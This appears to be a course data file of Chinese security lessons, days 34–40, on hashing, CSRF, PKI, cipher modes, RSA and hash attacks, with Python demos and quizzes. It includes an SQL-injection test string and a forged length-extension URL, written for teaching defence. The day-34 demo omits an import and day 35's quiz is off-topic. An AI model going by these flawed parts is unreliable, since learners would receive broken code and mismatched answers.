🔴 明文 → 🟠 Hash → 🟡 Hash+Salt → 🟢 慢Hash+Salt → 🟢🟢 Argon2id
为什么需要慢哈希？
├── SHA-256 太快了！GPU 每秒数十亿次
├── bcrypt/scrypt/Argon2 → 故意慢 + 耗内存
└── 暴力破解从 10^9/秒 降到 10^3/秒
密码存储方案对比：`,
  codeExample:{language:'python',code:`# Web安全综合实验\nimport hashlib, hmac\n\n# 1. 密码安全存储\npassword = \"MyP@ssw0rd!\"\nsalt = \"random_salt_2024\"\nhashed = hashlib.pbkdf2_hmac(\"sha256\", password.encode(), salt.encode(), 100000)\nprint(f\"PBKDF2哈希: {hashed.hex()[:32]}...\")\n\n# 2. CSRF Token生成\ntoken = hashlib.sha256(os.urandom(32)).hexdigest()\nprint(f\"CSRF Token: {token[:40]}...\")\n\n# 3. 输入安全验证\ndef safe_input(s):\n    import re\n    return bool(re.match(r'^[a-zA-Z0-9_@.-]+$', s))\n\nprint(f\"合法输入测试: {safe_input('user@email.com')}\")\nprint(f\"注入攻击测试: {safe_input('DROP TABLE users;--')}\")',description:'Web安全漏洞演示'},
  quiz:[{"id":"q34-1","question":"CSRF利用了什么进行攻击？","options":["SQL漏洞", "用户已登录的Cookie/Session", "XSS注入点", "服务器配置错误"],"correctIndex":1,"explanation":"CSRF盗用用户已登录的身份凭证。"},{"id":"q34-2","question":"CSRF防御最主要手段是？","options":["输入过滤", "CSRF Token验证", "HTTPS加密", "IP白名单"],"correctIndex":1,"explanation":"Token验证是主要防御手段。"},{"id":"q34-3","question":"SameSite=Strict的效果？","options":["允许所有跨站请求", "完全阻止跨站请求携带Cookie", "仅允许GET请求", "仅允许POST请求"],"correctIndex":1,"explanation":"Strict完全阻止跨站携带Cookie。"},{"id":"q34-4","question":"CSRF与XSS的核心区别？","options":["CSRF需要注入脚本", "CSRF利用用户已登录身份执行操作", "CSRF比XSS危害更大", "CSRF只能攻击GET请求"],"correctIndex":1,"explanation":"CSRF不注入脚本，利用现有登录态。"},{"id":"q34-5","question":"CSRF Token的正确存储方式？","options":["URL参数中", "Cookie中", "Session+表单隐藏字段", "LocalStorage"],"correctIndex":2,"explanation":"Token在Session和表单双存，提交时比对。"}],
  recommendedTools:weekToolMap[5]?.tools||[],labEnvironments:weekToolMap[5]?.labs||[],expertNotes:dayExpertNotes[34]||[],
});
allDays.push({
  id:'day-35',day:35,week:5,title:'数字签名与 PKI 体系：从签名原理到信任模型（加密技术）',
  objectives:['数字签名原理','签名流程与验证','PKI 体系架构'],
  content:`# 数字签名与 PKI 体系：从签名原理到信任模型
## 一、数字签名原理
\`\`\`
数字签名 = 用私钥加密消息的哈希
为什么这样设计？
1. 先哈希再签名（不是直接签名消息）
   ├── 签名算法（RSA/ECDSA）很慢
   ├── 消息可能很大（GB级文件）
   └── → 先哈希 → 得到固定长度的摘要 → 签名摘要
2. 签名 = 用签名者的私钥加密哈希值
   Sign(M) = Encrypt(Hash(M), PrivateKey)
   验证 = 用签名者的公钥解密签名 → 得到哈希
         = 重新计算 Hash(M)
         → 两个哈希是否相同？
\`\`\`
### 数字签名的三个属性
\`\`\`
数字签名提供的安全属性：
1. 完整性 (Integrity)
   签名的文档被篡改 → 哈希改变 → 验证失败
2. 认证性 (Authentication)
   签名用私钥生成 → 只有私钥持有者能产生有效签名
   验证通过 = 确认签名者的身份
3. 不可否认性 (Non-repudiation)
   签名者不能否认自己签过名
   → 因为签名需要签名者的私钥（只有他有）
   → 法律证据
数字签名 vs 纸质签名：
├── 纸质签名：签名每次都相同 → 容易被模仿
└── 数字签名：签名 = 对消息哈希的私钥加密
    → 不同消息的签名不同！无法从一个签名伪造另一个
\`\`\`
---
## 二、签名流程与验证
\`\`\`
数字签名的完整流程：
签名方 (Alice)：                     验证方 (Bob)：
文档 M                               
  │                                  
  ▼                                  
Hash(M) → 256位摘要                  
  │                                  
  ▼                                  
用 Alice私钥 加密摘要                 
  │                                  
  ▼                                  
数字签名 S                          收到 M + S
  │                                    │
  ├─────────────────────────────→     │
  │ M + S                             │
  │                                    ▼
  │                              验证过程：
  │                              1. 用 Alice公钥 解密 S → 得到 摘要1
  │                              2. 计算 Hash(M) → 得到 摘要2
  │                              3. 比对 摘要1 == 摘要2？
  │                                 │          │
  │                               相同≠       不同≠
  │                                 │          │
  │                               ✅通过       ❌拒绝
  │                              (完整性OK)  (被篡改/假签名)
\`\`\`
---
## 三、PKI 体系架构
### PKI 组成部分
\`\`\`
PKI (Public Key Infrastructure) =
一个由策略、程序、硬件、软件和人员组成的体系，
用于创建、管理、分发、使用、存储和撤销数字证书。
PKI 的五个核心组件：
1. CA (Certificate Authority) 证书认证中心
   ├── 签发证书
   ├── 撤销证书 (CRL/OCSP)
   └── 信任的起点 (Root CA)
2. RA (Registration Authority) 注册机构
   ├── 验证证书申请者的身份
   └── 不签发证书，只做身份核实
3. 证书库 (Certificate Repository)
   ├── 存储已签发的证书
   └── LDAP/HTTP 公开可查
4. 证书撤销 (CRL/OCSP)`,
  codeExample:{language:'python',code:`print("=== 数字签名与PKI ===\n")
print("数字签名=用私钥加密消息的哈希值")
print("签名流程: Hash(M) → 私钥加密 → 签名值\n")
print("签名提供三个属性:")
print("  1. 完整性: 篡改后验证失败")
print("  2. 认证性: 只有私钥持有者能签")
print("  3. 不可否认性: 签名者不能抵赖\n")
print("PKI信任模型:")
print("  CA签发 → 证书链验证 → 信任锚")
print("  CRL(吊销列表) + OCSP(在线查询)")
print("  证书=X.509=公钥+身份+CA签名\n")
print("RSA PKCS#1v2.2 ≥ 2048位")
print("ECDSA: 256位密钥=128位安全强度")`,description:'数字签名原理与PKI体系'},  quiz:[{"id":"q35-1","question":"CVSS评分中7.0-8.9属于什么级别？","options":["低危", "中危", "高危", "严重"],"correctIndex":2,"explanation":"7.0-8.9=高危。"},{"id":"q35-2","question":"SQL注入中基于SLEEP函数的叫？","options":["联合查询", "时间盲注", "布尔盲注", "报错注入"],"correctIndex":1,"explanation":"通过SLEEP函数观察响应时间。"},{"id":"q35-3","question":"XSS中CSP主要用于？","options":["加速加载", "限制可执行的脚本来源", "优化SEO", "压缩代码"],"correctIndex":1,"explanation":"CSP指定哪些来源的脚本可以执行。"},{"id":"q35-4","question":"以下哪个不是Web安全漏洞？","options":["SQL注入", "XSS", "CSRF", "ARP欺骗"],"correctIndex":3,"explanation":"ARP欺骗是网络层攻击。"},{"id":"q35-5","question":"漏洞管理中CVSS Score的最大作用是？","options":["唯一标识漏洞", "评定漏洞严重程度", "描述漏洞详情", "提供修复补丁"],"correctIndex":1,"explanation":"CVSS用于评定漏洞严重性(0-10)。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[35]||[],
});
allDays.push({
  id:'day-36',day:36,week:6,title:'分组密码工作模式与实战（加密技术）',
  objectives:['分组密码工作模式深度回顾','ECB模式的致命缺陷演示','CBC模式的填充Oracle攻击'],
  content:`# Day 36：分组密码工作模式与实战
### 1.1 为什么需要工作模式？
分组密码（如AES）只能加密**固定长度**的数据块（16字节/128位），而实际数据往往更大。工作模式定义了如何将多个分组连接起来加密。
\`\`\`
┌──────────────────────────────────────────────────────────────┐
│              工作模式核心选择维度                              │
├──────────────┬───────────────┬───────────────┬───────────────┤
│   模式       │   并行能力     │  是否需要IV   │   安全性      │
├──────────────┼───────────────┼───────────────┼───────────────┤
│   ECB        │   加密/解密   │   不需要      │   ⚠ 极不安全  │
│   CBC        │   解密可并行  │   需要，随机   │   ✅ 良好     │
│   CTR        │   加密/解密   │   需要，nonce  │   ✅ 良好     │
│   GCM        │   加密/解密   │   需要，nonce  │   ✅ 推荐     │
│   CFB        │   解密可并行  │   需要，随机   │   ✅ 良好     │
│   OFB        │   不可并行    │   需要，随机   │   ✅ 良好     │
└──────────────┴───────────────┴───────────────┴───────────────┘
\`\`\`
### 1.2 安全红线的演变
\`\`\`
历史轨迹：
1990s: ECB 广泛使用 → 2000s: 因"企鹅问题"被弃用
2000s: CBC 成为主流 → 2014: POODLE攻击揭示填充Oracle风险
2010s: GCM 崛起 → 当前: TLS 1.3 仅支持 AEAD 模式
\`\`\`
---
## 二、ECB模式的致命缺陷演示
### 2.1 经典的"企鹅问题"
ECB模式最形象的安全缺陷展示：
\`\`\`
原始图片（企鹅）：         ECB加密后（轮廓可见）：
■ ■ ■ ■ ■ ■ ■ ■ ■       ■ □ □ ■ ■ ■ □ □ □
■ □ □ □ □ □ □ □ ■       ■ □ □ □ □ □ □ □ ■
■ □ □ □ □ □ □ □ ■  →    ■ □ □ □ □ □ □ □ ■
■ ■ ■ ■ ■ ■ ■ ■ ■       ■ □ □ □ ■ • • • •
                         相同的明文块→相同的密文块
\`\`\`
**核心问题**：相同的明文分组加密后产生相同的密文分组。
### 2.2 真实攻击示例：Cookie钓鱼
\`\`\`
攻击场景：银行网站使用ECB加密Cookie中的用户角色
明文（16字节分组）：
Block 1: user=normaluser
Block 2: &role=user&mone
Block 3: y=1000&session=
攻击者通过调整输入位置，可以：
1. 将"&role=user"的密文替换为"&role=admin"的密文
2. 构造有效的管理员Cookie
原因：ECB下每个分组独立加密，块之间可以任意重排！
\`\`\`
### 2.3 考试要点
| 知识点 | 记忆关键词 |
|--------|-----------|
| ECB缺陷 | "相同明文→相同密文"、"企鹅效应"、"分块独立" |
| 不建议使用 | 任何生产环境都不应使用ECB |
| 例外 | 仅加密随机数据且单次使用、KMS内部部分场景 |
---
## 三、CBC模式的填充Oracle攻击
### 3.1 攻击原理
CBC模式解密公式：
\`\`\`
P_i = D_K(C_i) ⊕ C_{i-1}
\`\`\`
如果攻击者能知道"解密后填充是否合法"，就能逐字节恢复明文——**这就是POODLE攻击的核心**。
\`\`\`
攻击流程（Padding Oracle Attack）：
┌─────────────────────────────────────────────────────┐
│ 假设最后一个字节需要被猜测（padding值）               │
│                                                     │
│ C_{n-1}[15] ⊕ 0x01 = ?  (填充应为 0x01)            │
│                                                     │
│ 遍历修改C_{n-1}[15] 的256个可能值                    │
│   → 观察服务器返回："填充错误" 或 "MAC错误"?         │
│   → "MAC错误" = 填充通过检查 → 猜对！                │
│   → 由此可恢复 P_n[15] = 猜对的值 ⊕ 0x01            │
│                                                     │
│ 继续猜下一个字节...最终恢复全部明文                   │
└─────────────────────────────────────────────────────┘
\`\`\`
### 3.2 防御方法
| 方法 | 说明 |`,
  codeExample:{language:'python',code:'from Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nimport os\n\nkey = os.urandom(16)\ndata = b\"Attack at dawn!!Attack at dawn!!\"\n\n# ECB模式 - 不安全! 同明文→同密文\ncipher_ecb = AES.new(key, AES.MODE_ECB)\nct = cipher_ecb.encrypt(pad(data, 16))\nprint(f\"ECB模式: 同明文块产生相同密文块，不安全!\")\nprint(f\"密文块1: {ct[:16].hex()}\")\nprint(f\"密文块2: {ct[16:32].hex()}\")\nprint(f\"块1==块2: {ct[:16]==ct[16:32]}\")\n\n# GCM模式 - 推荐! 认证加密\ncipher_gcm = AES.new(key, AES.MODE_GCM)\nct2, tag = cipher_gcm.encrypt_and_digest(data)\nprint(f\"\\nGCM模式: 认证加密，每块密文唯一\")\nprint(f\"认证标签: {tag.hex()[:32]}...\")',description:'AES工作模式对比'},
  quiz:[{"id":"q36-1","question":"AES的固定分组大小是多少？","options":["64位", "128位", "256位", "512位"],"correctIndex":1,"explanation":"AES分组固定128位(16字节)。"},{"id":"q36-2","question":"ECB模式为什么不安全？","options":["加密速度太慢", "相同明文块产生相同密文块", "不需要密钥", "只能加密短文本"],"correctIndex":1,"explanation":"ECB同明文→同密文，暴露数据模式。"},{"id":"q36-3","question":"GCM模式提供什么特性？","options":["仅加密", "仅认证", "加密+认证", "仅签名"],"correctIndex":2,"explanation":"GCM=Galois/Counter Mode，认证加密模式。"},{"id":"q36-4","question":"CBC模式中IV的要求？","options":["必须保密", "必须不可预测(随机)", "固定为0", "长度为64位"],"correctIndex":1,"explanation":"CBC的IV必须是不可预测的随机值。"},{"id":"q36-5","question":"中国国产对称加密算法是？","options":["AES", "SM4", "RSA", "SM9"],"correctIndex":1,"explanation":"SM4是国密标准分组密码(128位)。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[36]||[],
});
allDays.push({
  id:'day-37',day:37,week:6,title:'非对称加密的攻击与防御（加密技术）',
  objectives:['RSA的数学脆弱面','常见RSA实现攻击','ECC的实现陷阱'],
  content:`# Day 37：非对称加密的攻击与防御
## 一、RSA的数学脆弱面
### 1.1 RSA安全性基石
\`\`\`
RSA安全性依赖于大数分解难题：
  给定 n = p × q（p、q为大素数）
  从 n 恢复 p 和 q 在计算上是不可行的
关键约束：
┌──────────────────────────────────────────────────────────┐
│  1. p 和 q 必须是随机生成的大素数（≥512位）               │
│  2. p 和 q 的差值必须足够大（|p-q| > 2^(nlen/2-100)）  │
│  3. p-1 和 q-1 必须有大的素因子                          │
│  4. 公钥 e 不应太小（常见 65537）                         │
│  5. 私钥 d 必须足够大（d > n^0.25/3）                    │
└──────────────────────────────────────────────────────────┘
\`\`\`
### 1.2 模数n共享攻击
\`\`\`
致命错误：两个用户共享相同的 n（即相同的 p,q）但使用不同的密钥对
设 Alice: (n, e_A, d_A)  Bob: (n, e_B, d_B)
Alice 用自己的私钥 d_A 可以计算：
  φ(n) = (p-1)(q-1)
  Bob的私钥 d_B = e_B^(-1) mod φ(n)
结论：任何知道自己密钥对的用户都能计算同一n下所有其他用户的私钥！
\`\`\`
### 1.3 小指数攻击
| 攻击类型 | 条件 | 危害 |
|----------|------|------|
| **低加密指数** | e=3, 相同明文加密给3个人 | 中国剩余定理恢复明文 |
| **低解密指数** | d < n^0.25 | Wiener攻击可恢复d |
| **共模攻击** | 同一m用(e1,e2)加密，gcd(e1,e2)=1 | 无需私钥恢复明文 |
| **Fermat分解** | \\|p-q\\| 过小 | 快速分解n |
---
## 二、常见RSA实现攻击
### 2.1 Bletchley攻击（ROCA漏洞，CVE-2017-15361）
\`\`\`
2017年发现的Infineon芯片RSA密钥生成漏洞：
原因：RSALib使用FastPrime算法加速密钥生成，但素数结构存在可预测性
影响：爱沙尼亚76万电子身份证需更换、大量TPM芯片受影响
攻击成本：约$40-80计算资源，每密钥约140 CPU小时
关键指标：密钥位数×2 + 密钥位数/2 次Miller-Rabin测试即可恢复私钥
教训：密码实现中任何"优化"都可能引入致命漏洞
\`\`\`
### 2.2 Bleichenbacher攻击（PKCS#1 v1.5）
\`\`\`
攻击目标：使用PKCS#1 v1.5填充的RSA加密
攻击原理：
1. 攻击者截获密文 C
2. 构造变形密文 C' 发送给服务器
3. 服务器尝试解密 → PKCS#1 v1.5填充验证
4. 根据服务器是否返回"填充错误"泄漏信息
   → "正确的PKCS#1结构" = 1位信息
5. 重复~2^20次查询 → 恢复明文
出现场景：TLS中RSA密钥交换、XML加密
防御：使用OAEP填充替代PKCS#1 v1.5
\`\`\`
### 2.3 随机数生成失败
\`\`\`
索尼PS3 ECDSA密钥泄露（2010）：
  ECDSA签名需要随机数 k
  索尼使用了固定的 k
  → 两个签名使用相同 k
  → 私钥可从两个签名中直接计算
公式推导：
  s1 = k^(-1)(z1 + r·d) mod n
  s2 = k^(-1)(z2 + r·d) mod n
  → k = (z1 - z2)/(s1 - s2) mod n
  → d = (s1·k - z1)/r mod n
教训：签名中随机数必须真正随机且唯一！
\`\`\`
---
## 三、ECC的实现陷阱
### 3.1 曲线选择的安全考虑
| 曲线类型 | 示例 | 安全评估 |
|----------|------|----------|
| **NIST曲线** | P-256, P-384, P-521 | 主流，但存在未知种子质疑 |
| **Curve25519** | X25519, Ed25519 | 现代推荐，安全设计 |
| **国密曲线** | SM2 | 中国国家标准 |
| **Brainpool** | brainpoolP256r1 | 欧洲标准，可验证参数 |
| **自定义曲线** | - | ⚠️ 极易出错，不要使用 |`,
  codeExample:{language:'python',code:'from Crypto.PublicKey import RSA\nfrom Crypto.Cipher import PKCS1_OAEP\n\nkey = RSA.generate(2048)\n\n# 公钥加密\npub = key.publickey()\ncipher = PKCS1_OAEP.new(pub)\nmsg = b\"CISP RSA Demo\"\nct = cipher.encrypt(msg)\nprint(f\"RSA-2048 加密: {ct.hex()[:40]}...\")\n\n# 私钥解密\ncipher2 = PKCS1_OAEP.new(key)\npt = cipher2.decrypt(ct)\nprint(f\"解密结果: {pt.decode()}\")\nprint(f\"\\nRSA基于: 大质因数分解难题\")\nprint(f\"ECC基于: 椭圆曲线离散对数难题\")',description:'RSA密钥生成与加密'},
  quiz:[{"id":"q37-1","question":"RSA算法的安全基础是？","options":["椭圆曲线离散对数", "大质因数分解难题", "哈希碰撞", "对称加密"],"correctIndex":1,"explanation":"RSA基于大质因数分解的数学难题。"},{"id":"q37-2","question":"ECC P-256与RSA-3072的安全强度关系？","options":["ECC弱很多", "大致相同", "RSA弱很多", "无法比较"],"correctIndex":1,"explanation":"256位ECC≈3072位RSA安全性。"},{"id":"q37-3","question":"公钥加密的典型用途？","options":["加密大量数据", "加密对称密钥", "替代哈希", "数据压缩"],"correctIndex":1,"explanation":"非对称加密慢，通常只用于加密会话密钥。"},{"id":"q37-4","question":"DH密钥交换的核心用途？","options":["加密文件", "在不安全信道协商共享密钥", "数字签名", "哈希认证"],"correctIndex":1,"explanation":"Diffie-Hellman用于安全协商对称密钥。"},{"id":"q37-5","question":"以下哪个是非对称密码算法？","options":["AES", "SHA-256", "ECC", "SM4"],"correctIndex":2,"explanation":"ECC(Elliptic Curve Cryptography)是非对称算法。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[37]||[],
});
allDays.push({
  id:'day-38',day:38,week:6,title:'哈希函数的攻防实战（加密技术）',
  objectives:['哈希碰撞攻击实战','长度扩展攻击','HMAC与密钥哈希'],
  content:`# Day 38：哈希函数的攻防实战
## 一、哈希碰撞攻击实战
### 1.1 MD5碰撞：从理论到实践
\`\`\`
MD5碰撞时间线：
2004 - 王小云团队：理论碰撞（2^39次哈希运算）
2007 - 选定的前缀碰撞（Chosen-Prefix Collision）
2008 - SSL证书碰撞：伪造CA证书
2012 - Flame恶意软件：使用MD5碰撞伪造Microsoft签名
2017 - SHAttered：SHA-1首次实际碰撞（2^63.1次SHA-1压缩函数）
关键影响：
  Flame使用MD5碰撞 → 微软Windows Update签名被伪造
  → 恶意软件以Windows Update身份传播
\`\`\`
### 1.2 选定的前缀碰撞
\`\`\`
攻击场景：两份内容不同但哈希相同的合同
合同A（良性）：                          合同B（恶意）：
"I agree to pay $500"                  "I agree to pay $50000"
        ↓                                       ↓
    哈希 H(A)                               哈希 H(B)
        ↓                                       ↓
        ╰──────────── H(A) = H(B) ─────────────╯
技术原理：
1. 固定前缀使两个文件哈希"轨迹"收敛
2. 选择合适的碰撞块（near-collision blocks）
3. 最终产生完全相同的哈希值
实际利用：
  → 两封内容不同的PDF，MD5相同
  → 数字签名可互换
  → 一个签名可验证两个不同文档
\`\`\`
### 1.3 SHAttered攻击（SHA-1首次碰撞）
\`\`\`
2017年2月23日，Google和CWI宣布SHA-1首次碰撞：
计算量：2^63.1次SHA-1压缩函数 ≈ 6500 CPU年 + 110 GPU年
两个不同PDF文件产生完全相同的SHA-1哈希
技术细节：
  → 使用"相同前缀碰撞"（Identical-Prefix Collision）
  → 基于Joint Zhao的《扰动向量的加速寻找》
  → 两个PDF通过JPEG数据中的扰动块实现碰撞
行业反应：
  → Git宣布迁移到SHA-256
  → 浏览器停止信任SHA-1证书
  → NIST 2013年已建议2020年前淘汰SHA-1
\`\`\`
---
## 二、长度扩展攻击
### 2.1 攻击原理
\`\`\`
Merkle-Damgård结构哈希（MD5、SHA-1、SHA-256）的共同弱点：
原始哈希过程：
H = H(secret || message)
攻击者可计算：
H' = H(secret || message || padding || appended_data)
...而不需要知道secret！
┌─────────────────────────────────────────────────┐
│ 内部状态 = H(secret || message)                  │
│                                                  │
│ 攻击者把 内部状态 作为新的起始状态                │
│ 继续计算 padded_data 的哈希                       │
│ → 得到 H' = H(secret || message || !! || extra) │
│                                                  │
│ 利用条件：需要知道secret的长度                    │
└─────────────────────────────────────────────────┘
\`\`\`
### 2.2 实际攻击场景
\`\`\`
场景：URL签名验证
  URL: /download?file=report.pdf&mac=H(secret||file=report.pdf)
  攻击者可以：
  1. 截获原URL和MAC
  2. 计算 new_MAC = H(secret || "file=report.pdf" || padding || "&file=passwords.txt")
  3. 构造新URL: /download?file=report.pdf<padding>&file=passwords.txt&mac=new_MAC
  4. 服务器验证通过 → 越权下载！
防御：
  ✅ 使用 HMAC（H(K⊕opad || H(K⊕ipad || message))）
  ✅ 切换到 SHA-3 / BLAKE2（海绵结构，天然免疫）
\`\`\`
### 2.3 受影响算法`,
  codeExample:{language:'python',code:'import hashlib\n\ndef demo_hash():\n    data = b\"CISP Security\"\n    h1 = hashlib.sha256(data).hexdigest()\n    h2 = hashlib.sha256(data).hexdigest()\n    \n    print(\"=== 哈希函数三大安全属性 ===\")\n    print(f\"输入: {data.decode()}\")\n    print(f\"SHA-256: {h1[:40]}...\")\n    \n    # 1. 确定性: 相同输入→相同输出\n    print(f\"\\n1. 确定性: {h1 == h2}\")\n    \n    # 2. 抗原像: 无法从哈希反推原文\n    print(f\"2. 抗原像(单向): 无法从哈希值反推原文\")\n    \n    # 3. 雪崩效应: 改1位→完全不同的哈希\n    data2 = b\"CISP SecuritY\"  # 改1字节\n    h3 = hashlib.sha256(data2).hexdigest()\n    diff = sum(1 for a,b in zip(h1,h3) if a!=b)\n    print(f\"3. 雪崩效应: 改1字节→{diff}个hex字符不同\")\n\ndemo_hash()',description:'哈希函数三大特性演示'},
  quiz:[{"id":"q38-1","question":"哈希函数的\"抗原像\"特性指？","options":["不同输入产生相同哈希", "从哈希值反推原文计算上不可行", "找到任意碰撞", "哈希速度极快"],"correctIndex":1,"explanation":"抗原像=单向不可逆。"},{"id":"q38-2","question":"SHA-256的输出长度？","options":["128位", "160位", "256位", "512位"],"correctIndex":2,"explanation":"SHA-256输出256位(32字节)。"},{"id":"q38-3","question":"MD5的现状是？","options":["最安全", "已破解，不应用于安全场景", "仅用于密码存储", "比SHA-256更安全"],"correctIndex":1,"explanation":"MD5于2004年被王小云院士破解。"},{"id":"q38-4","question":"密码存储中加盐(Salt)的主要目的是？","options":["加速哈希", "防止彩虹表攻击", "让密码更长", "节省存储"],"correctIndex":1,"explanation":"盐值使相同密码产生不同哈希，防彩虹表。"},{"id":"q38-5","question":"中国国密哈希算法是？","options":["MD5", "SHA-256", "SM3", "HMAC"],"correctIndex":2,"explanation":"SM3是中国国密标准哈希算法。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[38]||[],
});
allDays.push({
  id:'day-39',day:39,week:6,title:'数字签名与PKI部署实战（加密技术）',
  objectives:['证书透明化（Certificate Transparency）','证书钉扎（Certificate Pinning）','PKI信任模型深度对比'],
  content:`# Day 39：数字签名与PKI部署实战
## 一、证书透明化（Certificate Transparency）
### 1.1 为什么需要CT？
\`\`\`
传统PKI的致命缺陷：
  任何受信任的CA都能为任何域名签发证书
  → 如果CA被攻破或恶意行为
  → 可签发伪造的google.com证书
  → 浏览器完全信任它！
历史事件：
  2011 - DigiNotar CA被攻破：
    攻击者签发了google.com等531个域名的伪造证书
    被用于对伊朗用户进行大规模MITM
    直接导致DigiNotar破产
  2012 - TurkTrust错误签发中级CA：
    错误签发可用于签发任何证书的中间CA
    被用于Google域名的MITM
\`\`\`
### 1.2 CT三组件
\`\`\`
┌─────────────────────────────────────────────────────┐
│              Certificate Transparency 架构            │
│                                                      │
│  ① 证书日志 (Log)                                     │
│     - 只追加的Merkle树                                │
│     - 公开可审计                                      │
│     - 提交证书 → 获得SCT (Signed Certificate Timestamp)│
│                                                      │
│  ② 监控器 (Monitor)                                    │
│     - 持续扫描日志                                    │
│     - 检测可疑证书（如非预期的域名）                  │
│     - 告警域名所有者                                  │
│                                                      │
│  ③ 审计器 (Auditor)                                   │
│     - 验证日志行为一致性                              │
│     - 确保日志没有"分叉"                              │
│     - 检测日志是否合规                                │
└─────────────────────────────────────────────────────┘
\`\`\`
### 1.3 SCT交付方式
| 方式 | 说明 | 适用场景 |
|------|------|----------|
| **X.509 v3扩展** | CA提前获取SCT嵌入证书 | 推荐方式 |
| **TLS扩展** | 服务器在握手时发送SCT | 兼容旧CA |
| **OCSP Stapling** | OCSP响应中包含SCT | 补充方式 |
> **Chrome要求**：2021年起，所有新签发的证书必须提供至少2个SCT才能被信任。
---
## 二、证书钉扎（Certificate Pinning）
### 2.1 钉扎原理
\`\`\`
证书钉扎：客户端只信任预置的特定证书或公钥
类型对比：
┌────────────────┬──────────────────────┬──────────────────┐
│    钉扎类型    │       钉扎内容       │      优缺点      │
├────────────────┼──────────────────────┼──────────────────┤
│ 证书钉扎       │ 完整的证书           │ 精确但需频繁更新 │
│ 公钥钉扎       │ SPKI Hash            │ 证书更换不失效   │
│ CA钉扎         │ 只信任特定CA签发的   │ 较宽松但有限制   │
│ 叶证书+CA      │ 组合策略             │ 平衡安全与灵活   │
└────────────────┴──────────────────────┴──────────────────┘
HTTP公钥钉扎（HPKP）- 已废弃
  原因：配置错误导致站点永久无法访问（"HPKP自杀"）
  替代：Certificate Transparency + Expect-CT
\`\`\`
### 2.2 Android/iOS证书钉扎
\`\`\`java
// Android Network Security Config (网络配置文件)
<network-security-config>
    <domain-config>
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-01-01">
            <!-- 主证书备份密钥 -->
            <pin digest="SHA-256">7HIpactkIAq2Y49orFOOQKurWxmmSFZhBCoQYcRhJ3Y=</pin>
            <!-- 备份证书密钥（CA发生变化时使用） -->
            <pin digest="SHA-256">fwza0LRMXouZHRC8Ei+4PyuldPDcf3UKgO/04cDM1oE=</pin>
        </pin-set>
    </domain-config>
</network-security-config>
\`\`\`
### 2.3 钉扎最佳实践`,
  codeExample:{language:'python',code:'from Crypto.Signature import pss\nfrom Crypto.Hash import SHA256\nfrom Crypto.PublicKey import RSA\n\n# 生成密钥对\nkey = RSA.generate(2048)\nmessage = b\"CISP Official Document\"\n\n# 签名: 哈希→私钥加密哈希\nh = SHA256.new(message)\nsignature = pss.new(key).sign(h)\nprint(f\"原文: {message.decode()}\")\nprint(f\"签名(私钥): {signature.hex()[:48]}...\")\n\n# 验证: 公钥解密签名→比对哈希\nverifier = pss.new(key.publickey())\ntry:\n    verifier.verify(h, signature)\n    print(\"\\n✅ 签名验证通过: 完整+不可否认\")\nexcept:\n    print(\"\\n❌ 签名验证失败: 数据被篡改!\")',description:'数字签名流程'},
  quiz:[{"id":"q39-1","question":"数字签名用什么密钥签名？","options":["公钥", "私钥", "对称密钥", "会话密钥"],"correctIndex":1,"explanation":"私钥签名、公钥验证——不可搞反。"},{"id":"q39-2","question":"数字签名同时保障哪两个属性？","options":["机密性+可用性", "完整性+不可否认性", "机密性+完整性", "可用性+审计性"],"correctIndex":1,"explanation":"哈希比对=完整，私钥唯一=不可否认。"},{"id":"q39-3","question":"X.509数字证书包含？","options":["仅公钥", "仅身份信息", "公钥+主体身份+CA签名", "私钥+公钥"],"correctIndex":2,"explanation":"证书=公钥+身份信息+CA的数字签名。"},{"id":"q39-4","question":"PKI中CA的全称？","options":["Certificate Authority", "Central Administrator", "Cryptographic Algorithm", "Certified Auditor"],"correctIndex":0,"explanation":"证书颁发机构(Certificate Authority)是信任锚。"},{"id":"q39-5","question":"数字签名验证要用什么密钥？","options":["签名者的私钥", "签名者的公钥", "自己的私钥", "CA的私钥"],"correctIndex":1,"explanation":"用签名者的公钥验证签名。"}],
  recommendedTools:weekToolMap[6]?.tools||[],labEnvironments:weekToolMap[6]?.labs||[],expertNotes:dayExpertNotes[39]||[],
});
allDays.push({
  id:'day-40',day:40,week:6,title:'PKI 体系架构：证书管理与密钥生命周期（加密技术）',
  objectives:['PKI 的政策体系','密钥生命周期管理','HSM 硬件安全模块'],
  content:`# PKI 体系架构：证书管理与密钥生命周期
## 一、PKI 的政策体系
### CP 与 CPS
\`\`\`
CP (Certificate Policy) 证书策略
├── 描述证书的适用场景和要求
├── 回答：这个证书可以用来做什么？
└── 例如：该CA签发的证书仅用于企业内网认证
CPS (Certification Practice Statement) 认证实践声明
├── CA 如何执行其职责的操作细节
├── 回答：CA怎么验证身份？怎么保护私钥？
└── 例如：身份验证方式、密钥存储方式、审计频率
CP = 做什么 (What)
CPS = 怎么做 (How)
考试要点：CP 定义规则，CPS 描述实施
\`\`\`
### PKI 的安全控制
\`\`\`
CA 的安全保障：
物理安全
├── CA 服务器在安全的机房
├── 多重门禁、24×7 监控
└── 双人控制进入
操作安全
├── 密钥生成仪式 (Key Ceremony)
│   └── 多人见证 + 录像 + 审计 → 生成 Root CA 密钥
├── 双人控制 (2-person control)
│   └── 关键操作需两人同时授权
├── 职责分离
│   └── 系统管理员 ≠ 安全管理员 ≠ 审计管理员
└── 审计日志 → 不可删除
技术安全
├── HSM 存储 CA 私钥
├── 离线 Root CA (不联网)
└── 证书透明度日志
\`\`\`
---
## 二、密钥生命周期管理
\`\`\`
密钥生命周期：
生成 (Generation)
├── 在安全的密码设备中生成
├── 使用强随机数发生器 (TRNG)
└── 双人见证 (Root CA 密钥)
分发 (Distribution)
├── 公钥：通过证书传递
├── 私钥：绝不分发，仅存HSM
└── 对称密钥：安全信道 + 密钥加密密钥 (KEK)
存储 (Storage)
├── HSM 存储（CA密钥和重要私钥）
├── 软件存储（普通用户私钥，加密保护）
└── 绝不明文存储私钥
使用 (Usage)
├── 每个密钥只用于一个目的
│   ├── 签名密钥 ≠ 加密密钥
